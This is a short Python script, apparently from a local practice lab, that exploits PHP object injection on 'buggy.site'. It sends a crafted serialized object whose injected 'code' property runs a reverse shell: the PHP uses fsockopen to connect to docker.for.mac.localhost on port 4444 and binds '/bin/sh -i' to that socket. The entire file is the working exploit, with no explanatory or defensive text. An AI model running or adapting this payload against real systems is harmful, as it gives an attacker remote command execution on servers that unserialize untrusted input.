#!/usr/bin/python

import requests

if __name__ == '__main__':
    data = {'data': 'a:2:{s:4:"name";s:4:"User";s:4:"z123";O:26:"Examples\\Example4\\Example4":1:{s:7:"\0*\0code";s:81:"$sock=fsockopen("docker.for.mac.localhost",4444);exec("/bin/sh -i <&6 >&6 2>&6");";}}','XDEBUG_SESSION_START': 'PHPSTORM'}
    session = requests.session()

    response = session.get('http://buggy.site:8080/index.php', params=data)

    print response.text.encode('utf-8')